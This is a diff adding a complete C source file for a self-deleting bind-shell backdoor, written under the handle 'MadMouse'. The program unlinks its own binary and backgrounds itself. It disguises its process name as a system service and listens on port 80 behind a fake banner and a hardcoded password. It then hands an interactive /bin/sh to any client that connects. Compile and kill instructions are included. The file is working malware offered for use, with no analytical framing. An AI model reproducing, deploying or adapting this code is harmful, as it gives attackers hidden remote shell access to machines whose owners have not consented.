@@ -1,0 +1,105 @@
+//
+// A self immolating backdoor that hides itself :D
+//	Written by: MadMouse
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// SAFETY:
+//   /!\ DO NOT FORGET TO KILL THIS AFTER RUNNING IT, IT WILL LEAVE YOU WITH AN OPEN SHELL FACING THE INTERNET /!\
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/// Compile like this for good results:
+/// 	gcc -static -s backdoor.c -o inject -lutil
+/// kill it like this:
+/// 	sudo fuser -k -n tcp 80  # change 80 to whatever port you specified
+// ----------------------------------------------------------------------------
+// "THE BEER-WARE LICENSE" (Revision 43):
+// <aaronryool@gmail.com> wrote this file. As long as you retain this notice you
+// can do whatever you want with this stuff. If we meet some day, and you think
+// this stuff is worth it, you can buy me a beer in return Aaron R. Yool
+// ----------------------------------------------------------------------------
+
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <string.h>
+#include <pty.h>
+
+typedef int bool;
+#define false 0
+#define true 1
+
+#define SHELLPATH "/bin/sh"		// Whatever shell your little heart desires goes here
+#define SHELLOPTIONS "-i"			// shell options to be set as follows: "--option1","--option2" ......
+
+// a list of environment variables to be set, use the format: "key1=value","key2=value" ......
+#define ENVIRONMENT "TERM=xterm"
+
+// something similar to this: /sbin/wpa_supplicant -u -s -O /var/run/wpa_supplicant
+#define MAINPROCNAME "Call this something good"
+#define FORKPROCNAME "Call this something different"
+
+#define PORT 80
+#define PASSWORD "password"	//! FOR THE LOVE OF GOD CHANGE THIS
+const char banner[]="\n"; 					// make the banner look like a service you want to spoof
+const char welcome[]="\nGame Time :D\n\n";	// a cute little message to yourself, you might use it for scripting...
+
+void exit(int);
+/// check if the correct password was provided
+bool passtest(char *buffer,char *password)
+{
+	int i;
+	for(i=0;i<=strlen(buffer);++i)
+	{
+		if(buffer[i] == '\n' || buffer[i] == '\r')break;
+		else if(buffer[i] != password[i])return false;
+	}
+	if(strlen(buffer)-(strlen(buffer)-i) == strlen(password))return true;
+	return false;
+}
+
+void main(int count, char **arg)
+{
+	unlink(arg[0]);			// deletes itself
+	if(fork()>0)exit(1);	// forks and removes itself to the background
+
+	/// dont worry, its just an overflow into places where we dont have
+	/// anything else stored, and there is protection for this lol
+	memset(arg[0], 0, sizeof(MAINPROCNAME)); 	// zero out arg[0]
+	strncpy(arg[0],MAINPROCNAME,sizeof(MAINPROCNAME)); // over write that shit
+	
+	int s,sin,i;	// two sockets, and a counter
+
+	// one of my least favorite structs of all time
+	struct sockaddr_in name;
+	s = socket(AF_INET, SOCK_STREAM, 0);
+	name.sin_family = AF_INET;
+	name.sin_port = htons(PORT);
+	name.sin_addr.s_addr = htonl(INADDR_ANY);
+	
+	bind(s, (struct sockaddr *) &name, sizeof (name)); // bind listener to where we told it to bind
+	listen(s, 5);		// listen for connections
+	while(1)			// loop forever
+	{
+		sin = accept(s, 0, 0);			// accept a connection
+		int pid = forkpty(&i, 0, 0, 0);	// fork a pty so we can do our job
+		if(pid == 0)	// if the pid returned is the child
+		{
+			write(sin,banner,sizeof(banner));	// write the banner
+			char buffer[sizeof(PASSWORD)]="";	// create a buffer the size of password
+			read(sin,buffer,sizeof(buffer));	// read into that buffer the size of password
+			if(!passtest(buffer,PASSWORD))		// test the password and the buffer for a match
+			{
+				close(sin);		// on failure drop the connection and exit this thread
+				exit(0);
+			}
+			close(s);	// close the main socket
+			write(sin,welcome,sizeof(welcome));	// if this was the right password say welcome
+			for(i=2;i>=0;--i)	// duplicate socket into the standard input / standard outputs
+				dup2(sin,i);
+			close(sin);			// we dont need the socket anymore, its job is now delegated to standard in/out
+			const char* opt[]={FORKPROCNAME,SHELLOPTIONS,0};	// process name + options
+			const char* env[]={ENVIRONMENT,0};	// the environment variables to start with
+			execve(SHELLPATH,opt,env);	// execute the shell with the environment / options specified
+			exit(0);	// exit
+		}
+		else
+			close(sin);	// if this is the parent close sin and restart the loop
+	}
+}
